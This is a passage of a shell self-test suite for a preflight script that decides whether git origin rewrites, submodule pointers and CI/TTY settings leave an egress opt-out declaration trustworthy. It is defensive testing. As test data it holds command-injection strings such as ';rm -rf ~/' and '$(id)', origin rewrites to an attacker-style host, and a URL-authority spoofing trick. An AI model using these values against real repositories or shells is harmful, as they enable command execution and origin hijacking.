    if [ "$_bg_o" -eq 1 ]; then echo "FAIL: mutant $1 scenario is vacuous (the original already prints '$4')"; fail=1
    elif [ "$_bg_m" -eq 0 ]; then echo "FAIL: mutant $1 survived (it does not print '$4')"; fail=1
    else echo "PASS: mutant $1 is killed"; fi
    rm -rf "$_bk"
  }
  _bnd_gain bare-trust-dropped '/MUT-BARE/s/\[ .* \] || return 1 ;;/return 1 ;;/' "--boundary-only --boundary-advisory" 'declaration UNTRUSTED'
  git init -q "$_og/sepwork"; git -C "$_og/sepwork" symbolic-ref HEAD refs/heads/main   # a non-bare repository whose git dir is NOT named .git: its worktrees must not be trusted
  printf 'x\n' > "$_og/sepwork/f"; git -C "$_og/sepwork" add f
  # shellcheck disable=SC2086
  git -C "$_og/sepwork" $_gx commit -q -m base; mv "$_og/sepwork/.git" "$_og/sep.d"; printf 'gitdir: %s\n' "$_og/sep.d" > "$_og/sepwork/.git"
  git -C "$_og/sepwork" config core.worktree "$_og/sepwork"; git -C "$_og/sepwork" remote add origin "$_og/origin.git"
  git -C "$_og/sepwork" worktree add -q -b sepb "$_og/sepwt" 2>/dev/null
  _g_dir="$_og/sepwt"
  _ut non-bare-oddly-named-common-dir "git directory is outside this tree" "$_gd_rem"
  _bnd_kill bare-check-dropped '/MUT-BARE/s/\[ .* \] || return 1 ;;/: ;;/' "--boundary-only --boundary-advisory" has 'git directory is outside this tree'
  # a REAL submodule (a local bare source is allowed under the seam) is trusted; a pointer at its module dir from another directory is not
  git init -q "$_og/super"; git -C "$_og/super" symbolic-ref HEAD refs/heads/main
  printf 'x\n' > "$_og/super/f"; git -C "$_og/super" add f
  # shellcheck disable=SC2086
  git -C "$_og/super" $_gx commit -q -m base
  # shellcheck disable=SC2086
  git -C "$_og/super" $_gx -c protocol.file.allow=always submodule add -q "$_og/origin.git" sub 2>/dev/null
  _g_dir="$_og/super/sub"
  _ut submodule-untrusted "a submodule checkout" "run preflight from the superproject"   # a submodule's gitdir and .gitmodules entry are files an agent can write, so it binds to nothing unforgeable
  mkdir -p "$_og/forgedsub"; printf 'gitdir: %s\n' "$_og/super/.git/modules/sub" > "$_og/forgedsub/.git"
  _g_dir="$_og/forgedsub"
  _bnd_run "$_self" "--boundary-only --boundary-advisory"   # git itself resolves such a pointer to the superproject's tree, so owns_itself refuses it first (UNVERIFIED, nothing read)
  case "$_br_out" in
    *"declaration UNVERIFIED"*"not the root of its own git repository"*) echo "PASS: origin reader [forged-submodule-pointer] a forged submodule pointer reads no declaration (owns_itself refuses it)" ;;
    *"declared in .kit/boundary-optout.conf"*) echo "FAIL: origin reader [forged-submodule-pointer] a forged submodule pointer was read ($_br_out)"; fail=1 ;;
    *) echo "FAIL: origin reader [forged-submodule-pointer] ($_br_out)"; fail=1 ;;
  esac
  # SWAS-358 (security M1): a repository whose core.worktree points at a SIBLING directory is not its own root from its own directory: git prints an empty
  # --show-prefix there too, so owns_itself also requires --is-inside-work-tree to print true. A mutant that drops that condition must read the directory as owned.
  git init -q "$_og/cw"; mkdir -p "$_og/cwelse"; git -C "$_og/cw" config core.worktree "$_og/cwelse"
  if ( CDPATH='' cd "$_og/cw" && owns_itself "$PWD" ); then echo "FAIL: owns_itself [core-worktree-elsewhere] a repository whose core.worktree names another directory was read as its own root"; fail=1; else echo "PASS: owns_itself [core-worktree-elsewhere] a cwd outside the work tree is refused"; fi
  _g_dir="$_og/cw"; _g_decl=real
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"declaration UNVERIFIED"*"not the root of its own git repository"*) echo "PASS: origin reader [core-worktree-elsewhere] a directory outside its work tree reads no declaration (owns_itself refuses it)" ;;
    *) echo "FAIL: origin reader [core-worktree-elsewhere] ($_br_out)"; fail=1 ;;
  esac
  _bnd_kill owns-itself-inside-worktree-dropped '/MUT-OWNSINSIDE/s| && \[ "\$(git rev-parse --is-inside-work-tree 2>/dev/null)" = true \]||' "--boundary-only --boundary-advisory" has 'not the root of its own git repository'
  _g_dir="$_og/work"
  # D-241026-2, the realistic-config battery (fixture HOME and temp repos only; a dead local port stands in for the forge, so nothing leaves the machine).
  # 1. a global https -> ssh insteadOf rewrite (the commonest real trigger): a one-time FAIL that prints the set-url fix, then a pass after the fix.
  git init -q "$_og/rw"; git -C "$_og/rw" remote add origin 'https://127.0.0.1:1/x.git'
  printf 'Engineering Principles & Definition of Done\n' > "$_og/rw/CLAUDE.md"   # SWAS-784: export-shaped, or the plain-run exit cells below read the real body's refusal as no project and go weak
  mkdir -p "$_og/home3"; printf '[url "ssh://git@127.0.0.1:1/"]\n\tinsteadOf = https://127.0.0.1:1/\n' > "$_og/home3/.gitconfig"
  _g_home="$_og/home3"; _g_dir="$_og/rw"; _g_proj="$_bnd/off.json"; _g_decl=real; _g_env=""
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  _rw_want="  FAIL boundary: declaration UNTRUSTED (the effective origin URL differs from this repository's own remote.origin.url (url.*.insteadOf or an include), so origin is not this project's). Remedy: origin is rewritten by a url.<...>.insteadOf rule (git config --show-origin --get-regexp '^url\\.' shows where; matched: url.ssh://git@127.0.0.1:1/.insteadof in file:$_og/home3/.gitconfig); remove that rule, or if the rewrite is your own SSH preference, confirm the effective URL is your forge and then run: git remote set-url origin 'ssh://git@127.0.0.1:1/x.git'"
  case "$_br_out" in
    *"$_rw_want"*) echo "PASS: realistic config [ssh-insteadof] the exact message and one-line fix are printed" ;;
    *) echo "FAIL: realistic config [ssh-insteadof] the exact message was not printed ($_br_out)"; fail=1 ;;
  esac
  _ut ssh-insteadof "effective origin URL differs" "git remote set-url origin 'ssh://git@127.0.0.1:1/x.git'"
  # --boundary-offline NEVER relaxes UNTRUSTED
  _bnd_run "$_self" "--boundary-only --boundary-offline"
  case "$_br_out" in
    *"FAIL boundary: declaration UNTRUSTED ("*) if [ "$_br_rc" -eq 1 ]; then echo "PASS: s20 [offline-untrusted] --boundary-offline leaves UNTRUSTED a FAIL (exit 1)"; else echo "FAIL: s20 [offline-untrusted] exited $_br_rc"; fail=1; fi ;;
    *) echo "FAIL: s20 [offline-untrusted] --boundary-offline relaxed UNTRUSTED ($_br_out)"; fail=1 ;;
  esac
  _bnd_kill offline-relaxes-untrusted '/MUT-GATES/s/if boundary_decl_gates; then/if boundary_decl_gates \&\& [ "$BOUNDARY_OFFLINE" -eq 0 ]; then/' "--boundary-only --boundary-offline" has 'FAIL boundary: declaration UNTRUSTED ('
  _bnd_kill untrusted-mapped-to-unverified '/MUT-CLASS/s/echo UNTRUSTED/echo UNVERIFIED/' "--boundary-only --boundary-advisory" has 'declaration UNTRUSTED'
  _bnd_kill remedy-line-dropped '/MUT-REMEDY/s/ Remedy: \$BD_REMEDY//' "--boundary-only --boundary-advisory" has '). Remedy: origin is rewritten by a url.'
  # I1: UNTRUSTED sets bfail only when some part is OFF and needs the declaration; a fully ON user is told ("info"), exits 0, under --boundary-only and a plain run (a plain
  # all-ON run reads no declaration at all, so the plain face is asserted by the differential: the exit does not move).
  _g_proj="$_bnd/full.json"; _g_user="$_bnd/user-strict.json"
  _bo fully-on-untrusted-is-info 0 'info boundary: declaration UNTRUSTED (the effective origin URL differs' 'FAIL boundary: declaration UNTRUSTED'
  _bnd_exit fully-on-untrusted no
  _bnd_run "$_self" ""
  case "$_br_out" in
    *"FAIL boundary: declaration UNTRUSTED"*) echo "FAIL: fully-on plain run printed an UNTRUSTED FAIL ($_br_out)"; fail=1 ;;
    *) echo "PASS: boundary exit [fully-on-untrusted-plain] a plain run of a fully ON user prints no UNTRUSTED FAIL" ;;
  esac
  _g_ci=1; _bnd_run "$_self" "--boundary-only"; _g_ci=""   # the CI=true face: CI reads no declaration and never exits 1
  case "$_br_out" in
    *"declaration UNTRUSTED"*) echo "FAIL: fully-on-untrusted under CI read the declaration ($_br_out)"; fail=1 ;;
    *) if [ "$_br_rc" -ne 1 ]; then echo "PASS: boundary-only [fully-on-untrusted-ci] under CI=true the exit is not 1 (exit $_br_rc)"; else echo "FAIL: fully-on-untrusted under CI exited 1 ($_br_out)"; fail=1; fi ;;
  esac
  _bnd_kill gate-condition-dropped '/MUT-GATES/s/if boundary_decl_gates; then/if true; then/' "--boundary-only" has 'info boundary: declaration UNTRUSTED'
  _g_proj="$_bnd/off.json"; _g_user=""
  git -C "$_og/rw" remote set-url origin 'ssh://git@127.0.0.1:1/x.git'
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *UNTRUSTED*) echo "FAIL: realistic config [ssh-insteadof-after-fix] still UNTRUSTED after set-url ($_br_out)"; fail=1 ;;
    *"declaration UNVERIFIED"*) echo "PASS: realistic config [ssh-insteadof-after-fix] after the one-line fix the run passes the integrity check (the dead port reads UNVERIFIED)" ;;
    *) echo "FAIL: realistic config [ssh-insteadof-after-fix] ($_br_out)"; fail=1 ;;
  esac
  _bnd_exit ssh-insteadof-after-fix-exit yes   # the dead port is UNVERIFIED and a part is OFF (S20)
  # 2. a plain https origin and a plain ssh origin (no rewrite): not an integrity refusal, never gates.
  _g_home=""
  for _ou in 'https://127.0.0.1:1/x.git' 'git@127.0.0.1:x.git'; do
    git -C "$_og/rw" remote set-url origin "$_ou"
    _bnd_run "$_self" "--boundary-only --boundary-advisory"
    case "$_br_out" in
      *UNTRUSTED*) echo "FAIL: realistic config [plain-origin] $_ou read UNTRUSTED ($_br_out)"; fail=1 ;;
      *"declaration UNVERIFIED"*) echo "PASS: realistic config [plain-origin] $_ou is not an integrity refusal" ;;
      *) echo "FAIL: realistic config [plain-origin] $_ou ($_br_out)"; fail=1 ;;
    esac
    _bnd_exit "plain-origin $_ou" yes   # UNVERIFIED with a part OFF gates (S20); it is still not an integrity refusal (no UNTRUSTED above)
  done
  # S20 (owner ruling "355a: B revised"): the origin is unreachable (a dead port). A part is OFF, so from a terminal the run FAILs; --boundary-offline (typed) turns it into
  # a loud WARN and exit 0; an environment variable of that name changes nothing; a fully ON user, --boundary-advisory and CI are unchanged; one blip is absorbed by the retry.
  _g_home=""; _g_dir="$_og/rw"; _g_proj="$_bnd/off.json"; _g_user=""; _g_decl=real; _g_env=""
  git -C "$_og/rw" remote set-url origin 'https://127.0.0.1:1/x.git'
  _bo s20-unreachable-part-off-fails 1 'FAIL boundary: declaration UNVERIFIED (origin'"'"'s default branch could not be read (offline, or no access)) while a part is OFF. Remedy: retry when online, or type --boundary-offline' 'UNDECLARED'
  _bnd_run "$_self" "--boundary-only --boundary-offline"
  _s20_w='WARN boundary: declaration not verified (--boundary-offline typed on the command line; anyone can pass it: a visible act, not a control; the gate is not judged this run)'
  case "$_br_out" in
    *"$_s20_w"*) if [ "$_br_rc" -eq 2 ]; then echo "PASS: s20 [offline-flag] --boundary-offline prints the loud WARN line and --boundary-only reads UNVERIFIED (exit 2, S26)"; else echo "FAIL: s20 [offline-flag] exited $_br_rc ($_br_out)"; fail=1; fi ;;
    *) echo "FAIL: s20 [offline-flag] the WARN line was not printed ($_br_out)"; fail=1 ;;
  esac
  # a plain run (no --boundary-only) with --boundary-offline does not move the exit: the same rc as --boundary-advisory (the owner ruling: a plain preflight still exits 0)
  _bnd_run "$_self" "--boundary-offline"; _of_a=$_br_rc
  _bnd_run "$_self" "--boundary-advisory"; _of_b=$_br_rc
  if [ "$_of_a" -eq "$_of_b" ]; then echo "PASS: s26 [offline-plain] a plain run with --boundary-offline exits as --boundary-advisory does ($_of_a)"; else echo "FAIL: s26 [offline-plain] plain --boundary-offline exited $_of_a, advisory $_of_b"; fail=1; fi
  _bnd_kill offline-does-not-set-bunv '/MUT-OFFLINEUNV/s/bunv=1/:/' "--boundary-only --boundary-offline" rc 2
  _g_env=PREFLIGHT_BOUNDARY_OFFLINE=1
  _bo s20-env-var-is-not-the-flag 1 'FAIL boundary: declaration UNVERIFIED' 'WARN boundary: declaration not verified'
  _g_env=""
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  if [ "$_br_rc" -eq 0 ]; then echo "PASS: s20 [advisory] --boundary-advisory with an unreachable origin exits 0"; else echo "FAIL: s20 [advisory] exited $_br_rc"; fail=1; fi
  _g_ci=1; _bnd_run "$_self" "--boundary-only"; _g_ci=""   # the CI=true face: CI reads no declaration, so an unreachable origin cannot fail it
  case "$_br_out" in
    *"declaration UNVERIFIED"*) echo "FAIL: s20 [ci] CI read the declaration ($_br_out)"; fail=1 ;;
    *) if [ "$_br_rc" -ne 1 ]; then echo "PASS: s20 [ci] under CI=true an unreachable origin never exits 1 (exit $_br_rc)"; else echo "FAIL: s20 [ci] CI exited 1 ($_br_out)"; fail=1; fi ;;
  esac
  # S25 (Architect ruling): CI or GITHUB_ACTIONS set is CI only with NO TTY. The TTY comes from PREFLIGHT_TTY_SEAM=1|0, live only under the selftest flag. CI + TTY prints one WARN
  # and is judged as a human terminal; there is no real-run override.
  _s25w='WARN boundary: CI is set in an interactive terminal; judged as a human terminal'
  _g_proj="$_bnd/full.json"; _g_user="$_bnd/user-strict.json"; _g_ci=1; _g_tty=1
  _bnd_run "$_self" "--boundary-only"
  case "$_br_out" in
    *"$_s25w"*"ok   boundary: ON [static]"*) if [ "$_br_rc" -eq 0 ]; then echo "PASS: s25 [ci-tty-fully-on] a fully ON repo with CI set and a TTY passes (exit 0), judged [static], with the WARN"; else echo "FAIL: s25 [ci-tty-fully-on] exited $_br_rc ($_br_out)"; fail=1; fi ;;
    *) echo "FAIL: s25 [ci-tty-fully-on] ($_br_out)"; fail=1 ;;
  esac
  _g_proj="$_bnd/off.json"; _g_user=""
  _bnd_run "$_self" "--boundary-only"
  case "$_br_out" in
    *"$_s25w"*"FAIL boundary: declaration UNVERIFIED ("*) if [ "$_br_rc" -eq 1 ]; then echo "PASS: s25 [ci-tty-opted-out-unreadable] an opted-out repo with CI set, a TTY and an unreadable declaration FAILs (exit 1)"; else echo "FAIL: s25 [ci-tty-opted-out-unreadable] exited $_br_rc ($_br_out)"; fail=1; fi ;;
    *) echo "FAIL: s25 [ci-tty-opted-out-unreadable] ($_br_out)"; fail=1 ;;
  esac
  _bnd_kill ci-tty-skips-the-gate '/MUT-CITTY/s/&& boundary_has_tty/\&\& false/' "--boundary-only" rc 1
  # I1 (reviewer, 85cfcb8e; Architect option a): a committed-ON repo with CI set, a TTY and NO strict user scope FAILs (egress NOT ENFORCED and UNDECLARED), and the WARN says what to do
  _s25r='Remedy: on a CI runner that allocates a TTY, run `sh scripts/preflight.sh </dev/null 2>&1 | cat` (CI runners only; this gives CI mode, which reads only the committed project block)'
  _g_proj="$_bnd/full.json"; _g_user=""; _s25d=$_g_decl; _g_decl=@absent
  _bnd_run "$_self" "--boundary-only"
  _g_decl=$_s25d
  case "$_br_out" in
    *"$_s25w"*"$_s25r"*"egress: NOT ENFORCED and UNDECLARED"*) if [ "$_br_rc" -eq 1 ]; then echo "PASS: s25 [ci-tty-committed-on-no-user-scope] a committed-ON repo with CI, a TTY and no strict user scope exits 1 and prints the remedy"; else echo "FAIL: s25 [ci-tty-committed-on-no-user-scope] exited $_br_rc"; fail=1; fi ;;
    *) echo "FAIL: s25 [ci-tty-committed-on-no-user-scope] ($_br_out)"; fail=1 ;;
  esac
  _bnd_kill ci-tty-remedy-dropped '/MUT-CIREMEDY/d' "--boundary-only" has "$_s25r"
  _bnd_kill ci-tty-remedy-drops-stderr-redirect '/MUT-CIREMEDY/s/ 2>&1 | cat/ | cat/' "--boundary-only" has "$_s25r"   # S35: without 2>&1 fd 2 stays on the terminal and the remedy does nothing
  # S35 (security round 4e + reviewer I1, MEASURED under script(1)): the printed remedy must really give CI mode from a terminal. A fake PTY comes from script(1): the BSD/macOS form first,
  # then util-linux's. Where neither gives a terminal on fd 2 the cell is weak (FAIL under CI, like every weak result). The same shape WITHOUT `2>&1` is the control: it must read TTY.
  _s35_pty() {  # <inner sh command> -> _s35_out: the command run with a PTY on fds 0, 1 and 2; rc 1 when no PTY is available
    _s35_out=$(script -q /dev/null sh -c "$1; echo S35-END" </dev/null 2>&1) || _s35_out=""
    case "$_s35_out" in
      *S35-END*) return 0 ;;
    esac
    _s35_out=$(script -qec "$1; echo S35-END" /dev/null </dev/null 2>&1) || _s35_out=""
    case "$_s35_out" in
      *S35-END*) return 0 ;;
    esac
    return 1
  }
  _s35_d=$(mktemp -d); mkdir "$_s35_d/.claude"; cp "$_bnd/full.json" "$_s35_d/.claude/settings.json"; mkdir "$_s35_d/home"
  _s35_run="cd '$_s35_d' && env -u GITHUB_ACTIONS -u SANDBOX_RUNTIME CI=true HOME='$_s35_d/home' GIT_CONFIG_NOSYSTEM=1 sh '$_self' --boundary-only </dev/null"
  _s35_ok=0
  if command -v script >/dev/null 2>&1 && _s35_pty 'test -t 2 && echo S35-TTY2'; then
    case "$_s35_out" in
      *S35-TTY2*) _s35_ok=1 ;;
    esac
  fi
  if [ "$_s35_ok" -eq 1 ]; then
    _s35_pty "$_s35_run 2>&1 | cat"; _s35_fix=$_s35_out
    _s35_pty "$_s35_run | cat"; _s35_ctl=$_s35_out
    case "$_s35_fix" in
      *"jq absent"*) if [ -n "$_st_ci" ]; then echo "FAIL: s35 [remedy-gives-ci-mode] jq is absent and CI is set (a weak result is a failure)"; fail=1; else echo "PASS: (weak) s35 [remedy-gives-ci-mode] jq is absent here, so the boundary block is not observable"; fi ;;
      *"$_s25w"*) echo "FAIL: s35 [remedy-gives-ci-mode] the printed remedy still read a terminal on fd 2 ($_s35_fix)"; fail=1 ;;
      *"[declared]"*) echo "PASS: s35 [remedy-gives-ci-mode] under a PTY on fd 2 the remedy shape (</dev/null 2>&1 | cat) gives CI mode ([declared], no WARN)" ;;
      *) echo "FAIL: s35 [remedy-gives-ci-mode] the remedy run printed neither [declared] nor the WARN ($_s35_fix)"; fail=1 ;;
    esac
    case "$_s35_ctl" in
      *"$_s25w"*) echo "PASS: s35 [remedy-control-reads-tty] the same shape WITHOUT 2>&1 reads the terminal on fd 2 (the control is not vacuous)" ;;
      *"jq absent"*) if [ -n "$_st_ci" ]; then echo "FAIL: s35 [remedy-control-reads-tty] jq is absent and CI is set (a weak result is a failure)"; fail=1; else echo "PASS: (weak) s35 [remedy-control-reads-tty] jq is absent here"; fi ;;
      *) echo "FAIL: s35 [remedy-control-reads-tty] the shape without 2>&1 did not read a terminal ($_s35_ctl)"; fail=1 ;;
    esac
  elif [ -n "$_st_ci" ]; then echo "FAIL: s35 [remedy-gives-ci-mode] script(1) gives no PTY here and CI is set (a weak result is a failure)"; fail=1
  else echo "PASS: (weak) s35 [remedy-gives-ci-mode] script(1) gives no PTY on fd 2 here, so the remedy shape is not observable (the cell string and its mutants still ran)"; fi
  rm -rf "$_s35_d"
  _g_proj="$_bnd/off.json"
  _g_tty=0
  _bnd_run "$_self" "--boundary-only"
  case "$_br_out" in
    *"$_s25w"*|*"declaration UNVERIFIED"*) echo "FAIL: s25 [ci-no-tty] CI with no TTY did not keep the CI behaviour ($_br_out)"; fail=1 ;;
    *) if [ "$_br_rc" -ne 1 ]; then echo "PASS: s25 [ci-no-tty] CI set with no TTY keeps the CI behaviour (no WARN, no declaration read, exit $_br_rc)"; else echo "FAIL: s25 [ci-no-tty] exited 1"; fail=1; fi ;;
  esac
  _g_ci=""; _g_tty=""
  # m2: the redaction keeps a rule NAME readable and still redacts userinfo
  _rd=$(boundary_url_show 'url.git@github.com:')
  if [ "$_rd" = 'url.git@github.com:' ]; then echo "PASS: m2 [redact-rule-name] url.git@github.com: stays readable"; else echo "FAIL: m2 [redact-rule-name] gave '$_rd'"; fail=1; fi
  _rd=$(boundary_url_show 'url.tok3n@github.com:')
  if [ "$_rd" = 'url.***@github.com:' ]; then echo "PASS: m2 [redact-secret-userinfo] url.<secret>@host: keeps 'url.' and redacts the userinfo"; else echo "FAIL: m2 [redact-secret-userinfo] gave '$_rd'"; fail=1; fi
  _rd=$(boundary_url_show 'url.https://user:pw@host/.insteadof')
  case "$_rd" in
    'url.https://***@host/.insteadof') echo "PASS: m2 [redact-https-userinfo] url.https://user:pw@host/ keeps 'url.' and redacts the userinfo" ;;
    *) echo "FAIL: m2 [redact-https-userinfo] gave '$_rd'"; fail=1 ;;
  esac
  _g_proj="$_bnd/full.json"; _g_user="$_bnd/user-strict.json"
  _bo s20-fully-on-unreachable-is-info 0 'info boundary: declaration not read' 'FAIL boundary'
  _g_proj="$_bnd/off.json"; _g_user=""
  _bnd_exit s20-unreachable-moves-the-exit yes
  _bnd_kill unverified-never-gates '/MUT-UNVGATE/s/bfail=1/:/' "" moves yes
  _bnd_kill offline-line-dropped '/MUT-OFFLINELINE/d' "--boundary-only --boundary-offline" has "$_s20_w"
  # the retry: a seam that fails the FIRST attempt only. The real origin is reachable (a local bare repository under the seam); with the retry the read passes and is judged.
  _g_dir="$_og/work"; _g_env=PREFLIGHT_BOUNDARY_BLIP=1
  _bo s20-one-blip-is-absorbed 1 'OFF and UNDECLARED' 'declaration UNVERIFIED'
  _bnd_kill retry-removed '/MUT-RETRY/s/\[ "\$_bf_rc" -eq 3 \] && \[ "\$_bo_retry" -eq 1 \]/false/' "--boundary-only --boundary-advisory" has 'OFF and UNDECLARED'
  _g_env=""; _g_dir="$_og/rw"
  # 3. a rewrite to ANOTHER HOST is never offered as a set-url command (adopting it would launder a forged origin); a rewrite whose URL fails the safe charset gets no command.
  git -C "$_og/rw" remote set-url origin 'https://127.0.0.1:1/x.git'
  mkdir -p "$_og/home4"; printf '[url "https://evil.invalid/"]\n\tinsteadOf = https://127.0.0.1:1/\n' > "$_og/home4/.gitconfig"
  _g_home="$_og/home4"; _g_dir="$_og/rw"
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"set-url"*) echo "FAIL: realistic config [rewrite-other-host] a set-url command was offered for a rewrite to another host ($_br_out)"; fail=1 ;;
    *"the rewrite changes the HOST: do NOT adopt it unless you know it"*"matched: url.https://evil.invalid/.insteadof in file:$_og/home4/.gitconfig"*|*"matched: url.https://evil.invalid/.insteadof in file:$_og/home4/.gitconfig"*"the rewrite changes the HOST: do NOT adopt it unless you know it"*) echo "PASS: realistic config [rewrite-other-host] the remedy names the rule and its file, warns the HOST changes, and prints no set-url command" ;;
    *) echo "FAIL: realistic config [rewrite-other-host] ($_br_out)"; fail=1 ;;
  esac
  for _ij in ';rm -rf ~/' '$(id)/' '`id`/' "'x'/"; do
    # a pure transport swap (same host, same path) whose path holds shell syntax: S21 lets it through to the charset check, which must refuse to print a command
    printf '[url "ssh://git@127.0.0.1:1/"]\n\tinsteadOf = https://127.0.0.1:1/\n' > "$_og/home4/.gitconfig"
    git -C "$_og/rw" remote set-url origin "https://127.0.0.1:1/${_ij}x.git"
    _bnd_run "$_self" "--boundary-only --boundary-advisory"
    case "$_br_out" in
      *"set-url origin '"*) echo "FAIL: realistic config [remedy-injection] '$_ij' reached a set-url command ($_br_out)"; fail=1 ;;
      *"no safe set-url command is offered for this URL"*) echo "PASS: realistic config [remedy-injection] '$_ij' never appears in a command (no set-url is offered)" ;;
      *) echo "FAIL: realistic config [remedy-injection] '$_ij' ($_br_out)"; fail=1 ;;
    esac
  done
  # S21: a same-host rewrite to ANOTHER OWNER's repository changes the REPOSITORY: no set-url command, and the warning says so
  git -C "$_og/rw" remote set-url origin 'https://127.0.0.1:1/owner/x.git'
  printf '[url "https://127.0.0.1:1/attacker/"]\n\tinsteadOf = https://127.0.0.1:1/owner/\n' > "$_og/home4/.gitconfig"
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"set-url"*) echo "FAIL: realistic config [rewrite-other-owner] a set-url command was offered ($_br_out)"; fail=1 ;;
    *"the rewrite changes the REPOSITORY: do NOT adopt it"*) echo "PASS: realistic config [rewrite-other-owner] a same-host other-owner rewrite prints the REPOSITORY warning and no command" ;;
    *) echo "FAIL: realistic config [rewrite-other-owner] ($_br_out)"; fail=1 ;;
  esac
  _bnd_kill repository-check-dropped '/MUT-REPO/s/if .*; then/if false; then/' "--boundary-only --boundary-advisory" has 'the rewrite changes the REPOSITORY'
  git -C "$_og/rw" remote set-url origin 'https://127.0.0.1:1/x.git'
  # S23: the authority ends at the first / ? or #; an IPv6 host is always a host change
  for _hu in 'https://evil.example#@good.example/x|evil.example' 'https://evil.example?@good.example/x|evil.example' 'https://u:p@Good.example:8443/x|good.example' 'git@github.com:o/x.git|github.com'; do
    if [ "$(boundary_url_host "${_hu%%|*}")" = "${_hu#*|}" ]; then echo "PASS: remedy host [authority] ${_hu#*|}"; else echo "FAIL: remedy host [authority] '${_hu%%|*}' gave '$(boundary_url_host "${_hu%%|*}")'"; fail=1; fi
  done
  case "$(boundary_rewrite_remedy 'https://good.example/x.git' 'https://evil.example#@good.example/x.git')" in
    *"changes the HOST"*) echo "PASS: remedy host [fragment-trick] https://evil.example#@good.example/ is a host change" ;;
    *) echo "FAIL: remedy host [fragment-trick] was not read as a host change"; fail=1 ;;
  esac
  case "$(boundary_rewrite_remedy 'https://[::1]/x.git' 'https://[::1]/x.git')" in
    *"changes the HOST"*) echo "PASS: remedy host [ipv6] a [ host counts as a host change" ;;
    *) echo "FAIL: remedy host [ipv6] a [ host was not a host change"; fail=1 ;;
  esac
  printf '[url "ssh://git@127.0.0.1:1/"]\n\tinsteadOf = https://127.0.0.1:1/\n' > "$_og/home4/.gitconfig"
  git -C "$_og/rw" remote set-url origin 'https://127.0.0.1:1/;rm -rf ~/x.git'
  _bnd_kill url-charset-check-dropped '/MUT-URLSAFE/s/if .*; then/if true; then/' "--boundary-only --boundary-advisory" has 'no safe set-url command is offered for this URL'
  git -C "$_og/rw" remote set-url origin 'https://127.0.0.1:1/x.git'
  # 4. a credential in a URL (obviously fake tokens) never appears in any printed line; userinfo prints as ***; no command carries it
  printf '[url "git@127.0.0.1:"]\n\tinsteadOf = https://127.0.0.1:1/\n' > "$_og/home4/.gitconfig"   # the one exempt userinfo: a bare `git` stays pasteable
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"git remote set-url origin 'git@127.0.0.1:x.git'"*) echo "PASS: realistic config [git-userinfo-verbatim] git@host:path is shown verbatim in the set-url command" ;;
    *) echo "FAIL: realistic config [git-userinfo-verbatim] ($_br_out)"; fail=1 ;;
  esac
  for _cr in 'u:s3cr3tFAKE-NOT-A-TOKEN' 'FAKE-NOT-A-TOKEN0000' 'git:s3cr3tpw'; do
    printf '[url "https://%s@127.0.0.1:1/"]\n\tinsteadOf = https://127.0.0.1:1/\n' "$_cr" > "$_og/home4/.gitconfig"
    _bnd_run "$_self" "--boundary-only --boundary-advisory"
    case "$_br_out" in
      *"FAKE-NOT-A-TOKEN"*|*"s3cr3t"*) echo "FAIL: realistic config [credential-redacted] '$_cr' appears in the output ($_br_out)"; fail=1 ;;
      *"***"*"set-url origin '<your forge URL>'"*) echo "PASS: realistic config [credential-redacted] '$_cr' prints as *** and the command carries the placeholder" ;;
      *) echo "FAIL: realistic config [credential-redacted] '$_cr' ($_br_out)"; fail=1 ;;
    esac
  done
  _bnd_kill redaction-bypassed '/MUT-REDACT/s/ | sed .*   # MUT-REDACT/   # MUT-REDACT/' "--boundary-only --boundary-advisory" has '***'
  _g_home=""
  # a credential inside a remote URL is never echoed in the remedy
  for _us in 'https://tok:sec@h.example/x.git|https://***@h.example/x.git' 'https://ghp_FAKE0000@h.example/x.git|https://***@h.example/x.git' 'ssh://git:sec@h.example/x.git|ssh://***@h.example/x.git' 'ssh://git@h.example/o/x.git|ssh://git@h.example/o/x.git' 'ssh://git@h.example|ssh://git@h.example' 'ssh://git@h@evil.example/x|ssh://***@evil.example/x' 'git:secret@h.example:x.git|***@h.example:x.git' 'git@h.example:x.git|git@h.example:x.git' 'u:FAKE-NOT-A-TOKEN@h.example:x.git|***@h.example:x.git' 'ghp_FAKE@h.example:x.git|***@h.example:x.git'; do
    if [ "$(boundary_url_show "${_us%%|*}")" = "${_us#*|}" ]; then echo "PASS: remedy url [credential-stripped] ${_us#*|}"; else echo "FAIL: remedy url [credential-stripped] '${_us%%|*}' printed '$(boundary_url_show "${_us%%|*}")'"; fail=1; fi
  done
  # R4: since is judged against the LOCAL date. A stub date prints 2026-10-24 for -u and 2026-10-25 otherwise; since=2026-10-25 is real only on the local reading.
  _ds=$(mktemp -d); _rd=$(command -v date)
  printf '%s\n' '#!/bin/sh' 'case "$1" in -u) echo 2026-10-24 ;; +%Y-%m-%d) echo 2026-10-25 ;; *) exec '"$_rd"' "$@" ;; esac' > "$_ds/date"; chmod +x "$_ds/date"
  printf '%s\n' "part=all reason=r lost=l since=2026-10-25" > "$_bnd/d-localday.conf"
  _g_path="$_ds"; _g_dir=""; _g_decl="$_bnd/d-localday.conf"
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"(opted out 2026-10-25, declared in .kit/boundary-optout.conf)"*) echo "PASS: since-local-date a since equal to the LOCAL date is accepted when UTC is a day behind" ;;
    *) echo "FAIL: since-local-date ($_br_out)"; fail=1 ;;
  esac
  _bnd_kill since-uses-utc '/the LOCAL date (R4)/s/date +%Y-%m-%d/date -u +%Y-%m-%d/' "--boundary-only --boundary-advisory" has '(opted out 2026-10-25, declared in .kit/boundary-optout.conf)'
  _g_path=""; rm -rf "$_ds"
  # S7: declaration text is printed with printf '%s', so a backslash sequence is shown literally
  printf '%s\n' 'part=all reason=r lost=a\nb\c\x41 since=2026-10-23' > "$_bnd/d-bs.conf"
  bnd_case "$_bnd/off.json" "" "" "" "" "" "$_bnd/d-bs.conf"
  bnd_has declaration-text-printed-literally 'Lost: a\nb\c\x41 (kit:'
  _g_dir="$_og/work"; _g_decl=real
  # 37 / 38: an all-ON session makes NO ls-remote call for the declaration; the reader's ssh is BatchMode (a stub git records its arguments and GIT_SSH_COMMAND).
